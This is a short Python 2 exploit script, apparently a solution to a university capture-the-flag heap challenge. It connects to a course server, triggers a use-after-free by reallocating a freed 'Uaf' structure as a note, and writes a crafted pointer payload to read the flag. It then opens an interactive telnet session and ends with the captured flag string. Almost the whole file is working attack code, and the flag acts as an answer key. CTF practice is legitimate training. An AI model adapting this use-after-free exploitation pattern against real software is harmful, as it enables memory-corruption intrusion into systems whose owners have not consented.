#!/usr/bin/env python2

import struct
from socket import *
import telnetlib
import re
import struct

ip = 'secprog.cs.nctu.edu.tw'
port = 10109

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))
data = soc.recv(1024)
print(data)

# make a Uaf structure
soc.send("add\n")
data = soc.recv(1024)
print(data)
soc.send("0\n")
data = soc.recv(1024)
print(data)
soc.send("qq\n")
data = soc.recv(1024)
print(data)

# get the same memory region by creating an object sized sizeof(struct Uaf)
soc.send("note\n")
data = soc.recv(1024)
print(data)
soc.send("12\n")

# n = 0; buf = flag; next = NULL
soc.send("\x00\x00\x00\x00\x80\xa0\x04\x08\x00\x00\x00\x00\n")
data = soc.recv(1024)
print(data)
print("done")

# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()

# SECPROG{Tzuyu_Happy_Birthday_and_Everyone_ALL_PASS}
